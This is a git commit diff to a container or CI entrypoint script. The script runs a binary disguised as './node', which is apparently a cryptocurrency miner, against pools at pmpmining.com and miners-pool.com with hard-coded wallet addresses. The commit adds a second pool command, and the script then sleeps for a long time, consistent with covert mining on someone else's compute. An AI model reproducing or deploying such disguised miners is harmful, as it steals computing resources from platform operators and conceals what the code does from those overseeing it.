9677be057f7e74aac223d99917e68be3b702a362
menju2ikg8uti <menju2ikg8uti@kolabnow.com>
2026-02-05 09:50:14 +0700

    Update entrypoint.sh

--- 1/entrypoint.sh
+++ 1/entrypoint.sh
@@ -5,9 +5,10 @@ WORKER_NUMBER=$1
 PASSHOURS=$(date +%S)
 echo "start ${WORKER_NUMBER}"
 #./node -a yespower -o stratum+tcp://mine.pool.r4nd0m.us:6991 -u WXrBvF4x5fLiaw7aiWycJfbcVKukheuxak.crf_${HOURESX} -p c=SWAMP,mc=SWAMP > try.log
+# Qogecoin
 ./node --disable-gpu -a YescryptR16 -o stratum+tcp://us-central.pmpmining.com:5089 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.${WORKER_NUMBER}_crf > try.log
-sleep 60
-cat try.log
+# Crionic
+./node --disable-gpu -a YespowerLTNCG -o stratum+tcp://crnc.miners-pool.com:23007 -u KCxkuCyNyB9CDMujccuvWxCz5PUDoyxpSv.${WORKER_NUMBER}_crf > try.log
 
 
 sleep 29999
